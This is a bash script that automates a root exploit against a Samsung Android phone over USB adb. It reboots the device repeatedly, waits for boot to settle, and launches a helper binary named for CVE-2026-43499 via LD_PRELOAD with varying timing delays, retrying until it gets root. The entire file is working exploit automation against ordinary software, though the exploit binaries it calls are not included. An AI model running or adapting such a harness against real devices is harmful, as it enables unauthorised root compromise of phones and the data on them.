#!/bin/bash
# S25U root recovery loop (USB adb) — after 2026-10-28 08:55 crash
# One exploit shot per boot; reboot between rounds.
S=R5CY12Y97GV
LOG=/tmp/rootrec.log
: > $LOG
DELAYS=(25000 20000 30000 25000 15000 25000 35000 25000)

log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a $LOG; }

wait_dev(){
  for i in $(seq 1 25); do
    st=$(timeout 8 adb -s $S get-state 2>/dev/null)
    [ "$st" = "device" ] && { log "adb ok"; return 0; }
    sleep 6
  done
  log "adb NOT back"; return 1
}

for r in $(seq 1 6); do
  d=${DELAYS[$((r-1))]}
  log "=== ROUND $r/6 delay=$d ==="
  timeout 20 adb -s $S reboot 2>/dev/null
  sleep 10
  wait_dev || continue
  # wait for settled boot
  for i in $(seq 1 20); do
    up=$(timeout 8 adb -s $S shell 'cut -d. -f1 /proc/uptime' 2>/dev/null | tr -d '\r')
    [ -n "$up" ] && [ "$up" -ge 110 ] 2>/dev/null && { log "uptime=${up}s settled"; break; }
    sleep 8
  done
  timeout 15 adb -s $S shell "rm -f /data/local/tmp/rec.out" >/dev/null 2>&1
  timeout 20 adb -s $S shell "nohup sh -c 'CVE43499_ROOT_HELPER=/data/local/tmp/cve-2026-43499-root STACK_WRITER_DELAY_USEC=$d LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id > /data/local/tmp/rec.out 2>&1' >/dev/null 2>&1 &" >/dev/null 2>&1
  log "exploit launched"
  ok=0
  for i in $(seq 1 14); do
    sleep 11
    line=$(timeout 10 adb -s $S shell "grep -aE 'pipe physrw pid|refusing retry|exploit completed' /data/local/tmp/rec.out 2>/dev/null | tail -1" 2>/dev/null | tr -d '\r')
    case "$line" in
      *"root=1"*|*"exploit completed"*) log "ROOT OK (round $r)"; ok=1; break;;
      *"refusing retry"*) log "MISS window=0"; break;;
      *"pipe physrw"*) log "FAIL pipe: $line"; break;;
    esac
  done
  if [ "$ok" = "1" ]; then
    timeout 15 adb -s $S shell '/data/local/tmp/cve-2026-43499-root -c id' 2>&1 | tail -1 | tee -a $LOG
    echo "ROOT_OK_ROUND=$r" >> /tmp/rootrec.status
    exit 0
  fi
  sleep 3
done
log "ALL ROUNDS MISSED"
echo "NO_ROOT" >> /tmp/rootrec.status
